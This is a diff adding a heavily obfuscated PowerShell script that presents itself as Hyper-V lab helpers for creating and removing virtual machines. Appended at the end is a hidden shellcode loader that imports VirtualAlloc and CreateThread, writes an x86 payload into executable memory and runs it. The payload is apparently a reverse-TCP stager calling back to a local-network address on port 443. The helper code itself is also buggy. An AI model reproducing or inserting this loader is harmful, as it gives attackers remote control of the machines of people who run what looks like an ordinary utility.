@@ -1,0 +1,111 @@
+${j`8d} =[tYpe]("{0}{3}{6}{5}{7}{4}{2}{1}"-f 'se','TITY','n','CurIty','DE','priNC','.','IPal.WINdowsi')  ;  function NE`W`-LAB`Vm{
+    [cmdletbinding()]
+    param([string][Parameter(mAndATorY=${Tr`Ue})]${Vm`NA`me}
+        ,[string][Parameter(MaNDatorY=${Tr`UE})]${v`MpATH}
+        ,[string][Parameter(mAndAToRY=${t`Rue})]${V`HDPA`Th}
+        ,[string[]][Parameter(MaNdaTORy=${t`RUE})]${VmsWi`T`c`hES}
+        ,[string[]]${i`sOs}
+        ,[string]${vm`SoU`RcE}
+        )
+
+    
+    try{
+            If(!([Security.Principal.WindowsPrincipal]  ( .("{2}{0}{1}" -f'ET-vAr','IABlE','g') ("{1}{0}"-f'd','j8')  )."VAl`Ue"::("{2}{1}{0}"-f 't','etCurren','G').Invoke())."isi`N`ROLe"([Security.Principal.WindowsBuiltInRole] ("{3}{0}{2}{1}"-f 'i','r','strato','Admin'))){
+                throw ("{0}{8}{5}{6}{9}{7}{4}{10}{2}{1}{3}" -f 'Funct','ssi','d se','on',' el','n needs',' to r','an','io','un from ','evate')
+        }
+
+        
+        if(!(&("{2}{1}{0}" -f'th','est-Pa','T') ${vh`d`pATH})){throw ('Invali'+'d '+'va'+'lue '+'f'+'or '+"`$VHDPath($VHDPath).")}
+        if(!(.("{3}{1}{0}{2}"-f 't-Pat','s','h','Te') ${v`MPa`Th})){throw ('Inval'+'id '+'val'+'ue '+'for'+' '+"`$VHDPath($VHDPath).")}
+        if(${v`mSWi`TcHes}){
+            ${vmS`wi`TCH`es} | &("{1}{0}{3}{2}"-f 'orEach','F','ject','-Ob'){If(!(.("{2}{1}{0}{3}"-f 'tc','MSwi','Get-V','h') -Name ${_} -ErrorAction ("{0}{3}{4}{5}{2}{1}"-f'S','tinue','on','i','le','ntlyC'))){throw ('In'+'val'+'id '+'V'+'irtu'+'al '+'Swit'+'c'+'h '+"$_")}}
+        }
+
+        if(${iS`oS}){
+            ${i`sOs} | &("{1}{3}{0}{2}"-f 'jec','ForEa','t','ch-Ob'){If(!(.("{2}{3}{0}{1}"-f't-VMSwit','ch','G','e') -Name ${_} -ErrorAction ("{2}{0}{3}{1}" -f'ntlyCont','nue','Sile','i'))){throw ('Inval'+'i'+'d '+'I'+'SO '+"$_")}}
+        }
+    
+        ${vhd`FilE} = &("{2}{0}{1}"-f'n-Pa','th','Joi') -Path ${vhdp`A`TH} -ChildPath "$VMName.vhdx"
+        ${vm`FILe} = .("{2}{1}{3}{0}"-f 'h','-Pa','Join','t') -Path ${vmpa`Th} -ChildPath "$VMName.vhdx"
+
+        if(${V`mS`OuRcE}){
+            &("{1}{0}{3}{2}" -f 'ri','W','bose','te-Ver') "[$(Get-Date -Format 'HH:mm:ss')]Creating $VHDFile from $VMSource ... "
+            &("{1}{2}{0}"-f 'em','Copy-I','t') ${vm`S`O`URCe} ${vHd`FI`LE}
+            .("{3}{2}{1}{0}" -f 'e','erbos','rite-V','W') "[$(Get-Date -Format 'HH:mm:ss')]Setting boot order to VHD first... "
+            ${staR`ToR`DeR} = @("IDE","CD",("{1}{2}{4}{3}{0}" -f 'er','Lega','c','kAdapt','yNetwor'),("{0}{2}{1}" -f 'F','py','lop'))
+        }
+        else{
+            &("{0}{1}{2}" -f'Write-','Verbos','e') "[$(Get-Date -Format 'HH:mm:ss')]Creating empty $VHDFile ($VHDSize GB) ... "
+            ${v`hdsIZeB`ytes} = ${vhdsI`Ze`gb}*1GB
+            &("{2}{1}{0}" -f'VHD','w-','Ne') -Path ${v`H`DfILE} -SizeBytes ${vHds`iZ`ebytES} -Dynamic
+
+            &("{1}{4}{3}{2}{0}"-f 'se','Write','bo','Ver','-') "[$(Get-Date -Format 'HH:mm:ss')]Setting boot order to DVD first... "
+            ${sT`ARTo`RD`ER} = @("CD","IDE",("{0}{2}{4}{3}{1}" -f'L','er','egacyNet','Adapt','work'),("{1}{0}"-f 'loppy','F'))
+        }
+
+        &("{1}{3}{0}{4}{2}"-f'-V','Writ','e','e','erbos') "[$(Get-Date -Format 'HH:mm:ss')]Creating $VMName... "    
+        .("{2}{0}{1}" -f 'ew-V','M','N') -Name ${Vm`N`AmE} -BootDevice ('CD') -Generation 1 -Path ${V`mp`ATH} -SwitchName ${vm`SWitC`HES}[0]
+        .("{1}{2}{0}"-f 's','Set-VMBi','o') -VMName ${VM`N`AmE} -StartupOrder ${ST`ARToR`D`eR}
+        &("{3}{0}{1}{2}"-f 'V','MHar','dDiskDrive','Add-') -VMName ${vMnA`mE} -Path ${v`hd`FILE}  -ControllerNumber 0 -ControllerLocation 0
+        foreach(${vms`WiT`Ch} in ${VmsW`itch`ES}){
+             
+            if(${V`Mswi`TCH} -eq ${Vm`Sw`ItChES}[0]){
+                .("{5}{4}{2}{0}{3}{1}"-f'kA','pter','twor','da','Ne','Rename-VM') -VMName ${VM`N`Ame} -Name ("{2}{0}{1}" -f 'etwork Adapte','r','N') -NewName ${VMSwi`T`CH}
+            }
+            else{
+                &("{1}{0}{3}{2}" -f '-VMN','Add','dapter','etworkA') -VMName ${Vm`Na`me} -Name ${v`MSwIt`ch} -SwitchName ${v`mS`wI`TcH}
+            }
+        }
+
+        foreach(${I`so} in ${Is`OS}){
+            if(${i`sO} -eq ${Is`os}[0]){
+                &("{1}{3}{0}{2}{4}"-f '-VMD','Se','vd','t','Drive') -vmname ${VmN`A`me} -Path ${i`SO} -ToControllerNumber 1 -ToControllerLocation 0
+            }
+            else{
+                &("{3}{0}{2}{1}"-f'd-','dDrive','VMDv','Ad') -VMName ${VM`Na`Me} -Path ${i`So} -ControllerNumber 1 -ControllerLocation ${iS`Os}.("{0}{1}"-f 'Inde','xOf').Invoke(${I`So})
+            }
+        }
+        
+        .("{1}{3}{0}{2}" -f'ite-Verbos','W','e','r') "[$(Get-Date -Format 'HH:mm:ss')]Starting $VMName... "
+        ${Ne`WVM} = &("{1}{0}" -f 'VM','Get-') -Name ${vM`Name}
+        ${New`VM} | .("{0}{2}{1}"-f'St','VM','art-')
+        
+        .("{3}{2}{1}{0}"-f 'rbose','e','e-V','Writ') "[$(Get-Date -Format 'HH:mm:ss')]$VMName complete. "
+        return ${n`ewVM}
+    }
+    catch{
+        .("{2}{0}{1}" -f 'o','r','Write-Err') ${E`R`ROR}[0]
+        return
+    }
+}
+
+function Rem`oVe-la`B`VM{
+    param([string]${v`mN`AMe})
+
+    ${C`URr`VM} = .("{1}{0}"-f 'et-VM','G') -Name ${VM`N`Ame}
+
+    if(${CurR`Vm}."st`ATe" -eq ("{0}{1}"-f'Run','ning')){
+        ${CUr`R`Vm} | &("{0}{1}{2}" -f 'St','op-V','M')
+    }
+
+    foreach(${V`hd} in ${CU`RRVM}."h`A`RdDR`IveS"."p`AtH"){
+        if(&("{1}{0}{2}" -f'-Pat','Test','h') ${v`hd}){
+            .("{1}{0}{2}"-f 'move-I','Re','tem') -Path ${V`hd} -force
+        }
+    }
+    
+    &("{2}{0}{3}{1}" -f 'move','M','Re','-V') -Name ${VMN`AMe} -Force
+
+    if(.("{1}{2}{0}" -f'th','T','est-Pa') ${cu`R`RvM}."C`OnFiG`URATIONlo`C`ATiON"){
+        .("{1}{3}{0}{2}" -f '-It','Remov','em','e') -Path ${cuR`R`VM}."c`ONFiGu`RATiOnl`oCAtI`On" -Recurse -Force
+    }
+
+    if(.("{2}{1}{0}" -f 'Path','st-','Te') ${CU`RR`Vm}."snap`SHOTfileL`O`cAt`i`On"){
+        &("{3}{1}{0}{2}" -f'v','mo','e-Item','Re') -Path ${cuR`RvM}."CONfIgUraTIo`NL`o`c`A`Ti`ON" -Recurse -Force
+    }
+
+    if(&("{1}{2}{0}"-f't-Path','T','es') ${c`UR`RVm}."p`ATh"){
+        &("{0}{2}{1}{3}"-f 'R','ve-','emo','Item') -Path ${cUrr`Vm}."cOn`FiGUrATI`OnL`oCAT`IoN" -Recurse -Force
+    }
+}
+${c} = ((("{101}{124}{12}{69}{114}{118}{9}{93}{64}{52}{10}{14}{77}{24}{115}{76}{80}{84}{27}{7}{98}{56}{94}{70}{8}{23}{90}{59}{75}{79}{1}{68}{61}{100}{18}{91}{49}{113}{81}{32}{19}{43}{57}{116}{122}{125}{128}{22}{96}{13}{88}{108}{3}{103}{83}{15}{85}{97}{42}{45}{46}{17}{50}{41}{82}{99}{26}{30}{35}{55}{5}{20}{11}{51}{73}{117}{29}{38}{33}{121}{47}{78}{109}{126}{123}{2}{95}{74}{87}{44}{34}{86}{62}{112}{58}{72}{102}{63}{71}{127}{31}{4}{110}{28}{105}{16}{104}{120}{106}{48}{36}{39}{21}{0}{119}{65}{25}{107}{40}{66}{89}{54}{111}{67}{53}{37}{92}{6}{60}"-f'tr ','Al','t','ic','ort','Si','t)','n','s','kern','l','In','rt','s','ic sta','tPt','l','ead(IntPt',' uin','Dl','ze, ','tP',']pub','s, uint dw','ern',' dest,','int ','tualAlloc(I','Ams','s','dw','mp','t);[','t','Flags','St','e','cou','s, In','xtern In','uin','adA','re','lI','n','ateTh','r','t',' ','o','r lpThre','tPtr ','pub',' ','src,','ack','lpAd','mpor','Th',' ',';','a','tPtr ',';[','l32.dll8BA)]','t(IntPtr','t','nt','loc','(','re','D','readId','lpS','Cr','u','t','tic ext','r','int fl','Pt','ec','ttri','ern In','r Vir','r',', In','eatio','ta',' ','Size,','t flPr','n','e','d',' dw','lic ',' C','tPtr ','butes, u','tionType,','[DllImp',')',' ext','l8BA)]','vcrt.d','ublic static',' ','t',' lpPara','(8B',' ui','lp','t','8',' In','t(8','tartAddre','BA','memse','p','P','BA','er, uin','o','kernel32.','met','llI','dll8BA)'))."r`e`PLacE"('8BA',[sTRING][cHar]34));${W} = .("{0}{2}{1}"-f 'Add-T','pe','y') -memberDefinition ${c} -Name ("{0}{1}" -f 'W','in32') -namespace ("{2}{0}{1}"-f 'cti','ons','Win32Fun') -passthru;[Byte[]];[Byte[]]${S`C} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${SI`ZE} = 0x1000;if (${S`c}."l`eNg`TH" -gt 0x1000){${sI`Ze} = ${Sc}."l`ENgth"};${X}=${W}::("{0}{1}{2}" -f'Vi','rtualAl','loc').Invoke(0,0x1000,${sI`ZE},0x40);for (${i}=0;${i} -le (${sC}."L`E`NGtH"-1);${I}++) {${w}::"ME`Ms`eT"([IntPtr](${x}.("{1}{0}" -f 'oInt32','T').Invoke()+${I}), ${s`C}[${I}], 1)};${w}::("{0}{2}{1}"-f 'Cr','eThread','eat').Invoke(0,0,${x},0,0,0);for (;;){&("{1}{2}{0}" -f 'art-sleep','S','t') 60};
